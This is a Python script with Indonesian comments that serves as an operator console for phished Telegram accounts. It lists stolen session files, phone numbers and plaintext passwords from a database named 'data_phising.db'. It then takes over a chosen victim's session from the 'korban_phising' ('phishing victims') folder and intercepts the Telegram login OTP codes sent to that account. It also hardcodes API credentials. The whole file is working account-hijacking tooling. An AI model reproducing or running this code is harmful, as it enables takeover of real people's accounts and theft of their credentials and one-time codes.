import asyncio
import re
from telethon import TelegramClient, events
from colorama import Fore, Back, Style, init
import sqlite3
import os

# Inisialisasi colorama untuk tampilan berwarna
init(autoreset=True)


# Class bot untuk membaca OTP
class TelegramOTPBot:
    def __init__(self, api_id, api_hash, phone_number):
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone_number
        self.client = TelegramClient(phone_number, api_id, api_hash)

    async def start(self):
        try:
            await self.client.start()
            if not await self.client.is_user_authorized():
                print(Fore.RED + "❌ Akun belum terautentikasi! Silakan hapus session dan login ulang.")
                return

            print(Fore.GREEN  + f"✅ Berhasil Terhubung ke {self.phone_number}!")
            print("✅ Menunggu pesan OTP...")

            self.client.add_event_handler(self.otp_handler, events.NewMessage)
            await self.client.run_until_disconnected()

        except Exception as e:
            print(f"{Fore.RED}Error: {e}")

    async def otp_handler(self, event):
        message = event.message.message
        sender = await event.get_sender()

        if sender.first_name == "Telegram":
            otp_match = re.search(r"\b\d{4,6}\b", message)
            if otp_match:
                otp_code = otp_match.group()
                print(Back.Green + Fore.Red + f"📩 OTP Diterima dari {sender.first_name}: {otp_code}")


# Konfigurasi API
API_ID = '22003089'
API_HASH = '2681d1c1b490e153681df7c0d6b20a3b'
PHONE_NUMBER = None  # Akan diisi nanti oleh input

db_path = "data_phising.db"


def list_nomor():
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT id, session_file, phone_number, password, login_time FROM logins")
    list_numbers = cursor.fetchall()
    conn.close()

    if not list_numbers:
        print(f"{Fore.RED} Tidak ada nomor yang berhasil...")
        return None

    print(f"{Fore.CYAN}Daftar nomor yang berhasil:")
    print("ID | Session Name | Nomor | Password | Login Time")

    for item in list_numbers:
        print(f"{Fore.CYAN}{item[0]} | {item[1]} | {item[2]} | {item[3]} | {item[4]}")

    input_id = input(f"""
    Silahkan masukkan ID dari nomor yang ingin anda baca (1/2/3/4)
    {Fore.RED}Ketik 'exit' untuk keluar dari pemilihan nomor.
    ID: """).strip()

    if input_id.lower() == "exit":
        return None

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT session_file, phone_number FROM logins WHERE id=? LIMIT 1", (input_id,))
    result = cursor.fetchone()
    conn.close()

    if result:
        print(f"{Fore.GREEN}{result[0]} telah dipilih untuk pembacaan.")
        return result[0]  # Mengembalikan nomor telepon yang dipilih

    print("ID tidak ditemukan. Tekan Enter untuk kembali...")
    input()
    return None


async def main():
    global PHONE_NUMBER
    while True:
        os.system("clear" if os.name == "posix" else "cls")  # Bersihkan terminal
        print(f"{Fore.LIGHTBLUE_EX}{Back.BLACK}*** TELEGRAM BOT MANAGER ***\n")
        menu = input(f"""
           {Fore.GREEN}1. Lihat daftar nomor 
           {Fore.CYAN}2. Masukkan nomor yang ingin dibaca 
           {Fore.RED}3. Hapus semua nomor
           {Fore.MAGENTA}0. Exit program
           {Fore.WHITE}Pilih menu: """).strip()

        if menu == "1":
            PHONE_NUMBER = list_nomor()
            if PHONE_NUMBER:
                bot = TelegramOTPBot(API_ID, API_HASH, PHONE_NUMBER.split(".session")[0])
                await bot.start()
        elif menu == "2":
            PHONE_NUMBER = input("Input nomor: ").strip()
            if PHONE_NUMBER:
                bot = TelegramOTPBot(API_ID, API_HASH, f"korban_phising/{PHONE_NUMBER}")
                await bot.start()
        elif menu == "0":
            print("Keluar dari program...")
            break


if __name__ == "__main__":
    asyncio.run(main())  # Menjalankan program utama
